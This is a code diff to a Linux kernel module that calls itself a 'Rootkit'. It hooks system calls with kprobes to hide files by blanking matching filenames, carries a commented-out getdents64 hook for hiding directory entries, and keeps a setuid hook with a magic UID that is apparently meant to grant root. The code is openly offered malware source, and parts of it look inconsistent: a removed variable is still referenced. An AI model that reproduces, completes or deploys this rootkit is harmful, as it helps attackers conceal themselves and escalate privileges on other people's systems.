@@ -8,6 +8,7 @@
 #include <linux/dirent.h>
 #include <linux/uaccess.h>
 #include <linux/ptrace.h>
+#include <linux/fs.h>
 
 #include <linux/uaccess.h>
 
@@ -17,13 +18,19 @@ MODULE_AUTHOR("otitoko");
 MODULE_DESCRIPTION("Rootkit");
 MODULE_VERSION("0.1");
 
-atomic_t hooked = ATOMIC_INIT(0);
 
-#define PREFIX "wdb"
 #define MAGIC_UID 50
 
 #define _GLOBAL_ROOT_UID 0
 #define _GLOBAL_ROOT_GID 0
+
+struct getdents_callback64{
+	struct dir_context ctx;
+	struct linux_dirent64 __user * current_dir;
+	int prev_reclen;
+	int count;
+	int error;
+};
 
 
 
@@ -61,27 +68,23 @@ struct getdents_data{
     int skip_file;
 };
 
+static struct kprobe kp={
+    .symbol_name        =symbol,
+};
 
 
 static int __kprobes pre_handler(struct kprobe *p, struct pt_regs *regs){
     char * filename = (char *)regs->si;
 
-	pr_info("<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
+	printk(KERN_INFO "<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
 		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si, regs->flags);
-	for (int i = 0; i < 2; i++) {
-		if (strcmp(filename, hidden_filenames[i]) == 0) {
+		if (strcmp(filename, hidden_filenames[0]) == 0) {
 			strcpy((char *)regs->si, "\x00");
 		}
-	}
-
 	return 0;
 }
 
-static struct kprobe kp={
-    .symbol_name        =symbol,
-    .pre_handler        =pre_handler,
-};
-
+/*
 static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 	printk(KERN_INFO "stepping through entry handler");
 	struct getdents_data *data;
@@ -156,7 +159,6 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 		printk(KERN_ERR "could not copy %ld bytes from user",ret);
 		printk(KERN_ERR "copy_from_user error: %ld",error);
 	}
-/*
 	while(offset<ret){
 		current_dir = (void *)kbuf+offset;
 		printk(KERN_INFO "d_name of the current dir is: %l", current_dir->d_name);
@@ -165,7 +167,6 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 	}
 
 //	error=copy_to_user(dentry_data,kbuf,ret);
-*/
 
 		return 0;
 }
@@ -177,7 +178,7 @@ static struct kretprobe  __x64_sys_getdents64_hook= {
 	.data_size		=sizeof(struct getdents_data),
 	.maxactive		=20,
 };
-
+*/
 
 struct kprobe __x64_sys_setuid_hook = {
         .symbol_name = "__x64_sys_setuid",
@@ -199,9 +200,12 @@ static int __init rkin(void)
         atomic_inc(&hooked);
     }
 */
+    kp.pre_handler=pre_handler;
     int ret=register_kprobe(&kp);
     if(ret<0){
         printk(KERN_ERR"could not register handler");
+	return ret;
+    }
     return 0;
 }
 
